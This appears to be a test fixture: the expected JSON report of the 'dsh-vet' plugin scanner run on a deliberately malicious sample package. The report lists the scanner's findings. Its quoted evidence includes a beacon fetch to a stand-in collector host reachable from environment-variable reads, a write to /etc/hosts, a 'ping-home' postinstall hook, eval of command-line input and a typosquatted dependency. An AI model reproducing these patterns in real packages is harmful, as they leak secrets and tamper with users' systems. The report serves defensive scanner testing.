@@ -1,0 +1,274 @@
+{
+  "schema": "dsh-vet/v1",
+  "target": {
+    "kind": "local-path",
+    "specifier": "<fixture:offender-kitchen-sink>"
+  },
+  "scanner": {
+    "name": "dsh-vet",
+    "version": "0.0.0",
+    "ranAt": "2026-01-01T00:00:00.000Z"
+  },
+  "summary": {
+    "grade": "D",
+    "counts": {
+      "critical": 0,
+      "high": 2,
+      "medium": 8,
+      "low": 1,
+      "info": 3
+    }
+  },
+  "findings": [
+    {
+      "id": "egress.secret-adjacent",
+      "title": "Network calls reachable from code that reads secrets",
+      "severity": "high",
+      "confidence": "medium",
+      "evidence": [
+        {
+          "file": "index.js",
+          "line": 7,
+          "snippet": "const who = process.env.HOME",
+          "note": "reads process.env; fetch in index.js:12 is statically reachable from here"
+        }
+      ],
+      "remediation": "Keep secret reads and network clients in separate modules, or document the intended data flow for each endpoint.",
+      "references": [
+        "https://github.com/rogerdigital/dsh-vet/blob/main/docs/rules/egress.secret-adjacent.md"
+      ]
+    },
+    {
+      "id": "perm.undeclared-fs-write",
+      "title": "Writes or deletes files outside any plausible plugin scope",
+      "severity": "high",
+      "confidence": "high",
+      "evidence": [
+        {
+          "file": "index.js",
+          "line": 9,
+          "snippet": "fs.writeFileSync('/etc/hosts', '127.0.0.1 everything.local')",
+          "note": "fs.writeFileSync with literal path /etc/hosts"
+        }
+      ],
+      "remediation": "Keep writes inside the workspace or the DSH home directory; derive paths from config, not literals.",
+      "references": [
+        "https://github.com/rogerdigital/dsh-vet/blob/main/docs/rules/perm.undeclared-fs-write.md"
+      ]
+    },
+    {
+      "id": "dep.floating-range",
+      "title": "Runtime dependencies resolve to whatever the registry serves",
+      "severity": "medium",
+      "confidence": "high",
+      "evidence": [
+        {
+          "file": "package.json",
+          "note": "\"dsh-searngx\": \"*\" — any future version satisfies this"
+        }
+      ],
+      "remediation": "Pin to a exact version or a narrow range.",
+      "references": [
+        "https://github.com/rogerdigital/dsh-vet/blob/main/docs/rules/dep.floating-range.md"
+      ]
+    },
+    {
+      "id": "dep.install-scripts",
+      "title": "Runs code at install time",
+      "severity": "medium",
+      "confidence": "high",
+      "evidence": [
+        {
+          "file": "package.json",
+          "snippet": "node scripts/ping-home.js",
+          "note": "postinstall script runs when the package is installed"
+        }
+      ],
+      "remediation": "Remove the lifecycle script, or move the work to a prepublish/build step and document why install-time execution is required.",
+      "references": [
+        "https://github.com/rogerdigital/dsh-vet/blob/main/docs/rules/dep.install-scripts.md"
+      ]
+    },
+    {
+      "id": "obf.charcode-chain",
+      "title": "Builds strings from character codes",
+      "severity": "medium",
+      "confidence": "medium",
+      "evidence": [
+        {
+          "file": "index.js",
+          "line": 5,
+          "note": "decodes to \"hint: 12…\""
+        }
+      ],
+      "remediation": "Write the string literal directly.",
+      "references": [
+        "https://github.com/rogerdigital/dsh-vet/blob/main/docs/rules/obf.charcode-chain.md"
+      ]
+    },
+    {
+      "id": "obf.dynamic-require",
+      "title": "Loads modules through a computed specifier",
+      "severity": "medium",
+      "confidence": "medium",
+      "evidence": [
+        {
+          "file": "index.js",
+          "line": 19,
+          "snippet": "const dyn = require('./dyn-' + 'mod.js')",
+          "note": "require of a concatenation that statically resolves to \"./dyn-mod.js\""
+        }
+      ],
+      "remediation": "Use the plain specifier; concatenated module names hide the dependency from review.",
+      "references": [
+        "https://github.com/rogerdigital/dsh-vet/blob/main/docs/rules/obf.dynamic-require.md"
+      ]
+    },
+    {
+      "id": "obf.encoded-payload",
+      "title": "Long base64/hex string literals in shipped code",
+      "severity": "medium",
+      "confidence": "low",
+      "evidence": [
+        {
+          "file": "index.js",
+          "line": 4,
+          "snippet": "aGVsbG8gd29ybGQgdGhpcyBpcyBhIGJhc2U2NCBibG9iIDEyMzQ1Njc4OTA=",
+          "note": "base64 literal, 60 chars"
+        },
+        {
+          "file": "orphan.js",
+          "line": 1,
+          "snippet": "5468697320697320612068657820656e636f646564207061796c6f6164",
+          "note": "hex literal, 58 chars"
+        }
+      ],
+      "remediation": "Decode payloads to plain assets, or ship them as files a reviewer can open.",
+      "references": [
+        "https://github.com/rogerdigital/dsh-vet/blob/main/docs/rules/obf.encoded-payload.md"
+      ]
+    },
+    {
+      "id": "obf.eval-detect",
+      "title": "Evaluates dynamically built code",
+      "severity": "medium",
+      "confidence": "medium",
+      "evidence": [
+        {
+          "file": "index.js",
+          "line": 17,
+          "snippet": "eval(process.argv[2])",
+          "note": "eval of a non-literal argument"
+        }
+      ],
+      "remediation": "Replace eval/new Function with direct code; dynamic evaluation defeats static audit.",
+      "references": [
+        "https://github.com/rogerdigital/dsh-vet/blob/main/docs/rules/obf.eval-detect.md"
+      ]
+    },
+    {
+      "id": "perm.network-client",
+      "title": "Opens network connections",
+      "severity": "medium",
+      "confidence": "high",
+      "evidence": [
+        {
+          "file": "index.js",
+          "line": 12,
+          "snippet": "fetch('https://collect.example.com/beacon', {",
+          "note": "no \"web\" seam declared (https://collect.example.com/beacon)"
+        }
+      ],
+      "remediation": "Declare the web seam in dsh.seams, or drop the network access.",
+      "references": [
+        "https://github.com/rogerdigital/dsh-vet/blob/main/docs/rules/perm.network-client.md"
+      ]
+    },
+    {
+      "id": "perm.subprocess-spawn",
+      "title": "Spawns subprocesses",
+      "severity": "medium",
+      "confidence": "high",
+      "evidence": [
+        {
+          "file": "index.js",
+          "line": 10,
+          "snippet": "cp.exec('uname -a')",
+          "note": "no \"shell\" seam declared"
+        }
+      ],
+      "remediation": "Declare the shell seam in dsh.seams, or avoid spawning processes.",
+      "references": [
+        "https://github.com/rogerdigital/dsh-vet/blob/main/docs/rules/perm.subprocess-spawn.md"
+      ]
+    },
+    {
+      "id": "dep.typosquat-proximity",
+      "title": "Dependency name is one or two edits from a popular dsh-* package",
+      "severity": "low",
+      "confidence": "medium",
+      "evidence": [
+        {
+          "file": "package.json",
+          "note": "\"dsh-searngx\" is 2 edits from \"dsh-searxng\""
+        }
+      ],
+      "remediation": "Verify the dependency is the package you mean — exact spelling, real repository, real publisher.",
+      "references": [
+        "https://github.com/rogerdigital/dsh-vet/blob/main/docs/rules/dep.typosquat-proximity.md"
+      ]
+    },
+    {
+      "id": "egress.outbound-endpoints",
+      "title": "Outbound endpoints the code can contact",
+      "severity": "info",
+      "confidence": "high",
+      "evidence": [
+        {
+          "file": "index.js",
+          "line": 12,
+          "snippet": "fetch('https://collect.example.com/beacon', {",
+          "note": "endpoint collect.example.com"
+        }
+      ],
+      "remediation": "Document each endpoint in the README; every host here is a data-flow decision you own.",
+      "references": [
+        "https://github.com/rogerdigital/dsh-vet/blob/main/docs/rules/egress.outbound-endpoints.md"
+      ]
+    },
+    {
+      "id": "obf.eval-detect",
+      "title": "Evaluates a literal string as code",
+      "severity": "info",
+      "confidence": "high",
+      "evidence": [
+        {
+          "file": "orphan.js",
+          "line": 2,
+          "snippet": "eval('console.log(key)')",
+          "note": "eval of a constant string — inert but still eval"
+        }
+      ],
+      "remediation": "Move the code out of the string literal.",
+      "references": [
+        "https://github.com/rogerdigital/dsh-vet/blob/main/docs/rules/obf.eval-detect.md"
+      ]
+    },
+    {
+      "id": "perm.unreachable-files",
+      "title": "Shipped files not reachable from any declared entry point",
+      "severity": "info",
+      "confidence": "high",
+      "evidence": [
+        {
+          "file": "orphan.js",
+          "note": "no static import path from any entry point reaches this file"
+        }
+      ],
+      "remediation": "Dead files still ship and can be required dynamically; delete them or wire them into the graph.",
+      "references": [
+        "https://github.com/rogerdigital/dsh-vet/blob/main/docs/rules/perm.unreachable-files.md"
+      ]
+    }
+  ]
+}
